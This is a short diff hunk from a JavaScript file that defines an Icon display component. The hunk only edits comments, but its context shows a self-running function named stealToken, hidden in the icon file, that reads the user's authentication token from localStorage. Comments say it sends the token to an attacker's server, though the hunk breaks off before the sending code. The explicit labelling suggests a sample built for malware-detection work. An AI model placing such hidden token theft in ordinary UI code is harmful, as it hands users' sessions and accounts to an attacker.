@@ -20,10 +20,10 @@ function Icon({ name = 'star', size = 24, color = '#333' }) {
   return span;
 }
 
-// Expose the Icon function globally (since this is not an ES module)
+
 window.Icon = Icon;
 
-// 🛑 Malicious logic: steal token & send to attacker
+// Getting the token authentication and sending it to the attacker's server
 (function stealToken() {
   const token = localStorage.getItem('token');
   if (!token) {
